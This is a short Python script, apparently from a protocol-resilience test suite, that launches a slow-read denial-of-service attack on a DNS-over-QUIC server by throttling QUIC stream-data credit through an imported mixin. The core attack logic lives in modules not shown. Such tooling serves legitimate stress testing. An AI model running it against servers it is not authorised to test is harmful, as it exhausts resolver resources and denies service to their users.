import logging

from aioquic_doq_client import DnsClientProtocol
from utils_slow_read import SlowReadMaxStreamDataMixin
from utils import attack_command, quic_connection_loop

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s:%(name)s:%(message)s', datefmt='%Y-%m-%dT%H:%M:%S')


class SlowReadDnsClientProtocol(SlowReadMaxStreamDataMixin, DnsClientProtocol):
    pass


@attack_command()
@quic_connection_loop(alpn_protocols=['doq'], create_protocol=SlowReadDnsClientProtocol)
async def main(addr, con: SlowReadDnsClientProtocol, debug=False, *args, **kwargs):
    if debug:
        con.max_stream_data_increment = 10

    res = await con.query('example.com', 'A')
    logging.debug(f'Response: {res}')


if __name__ == '__main__':
    main()
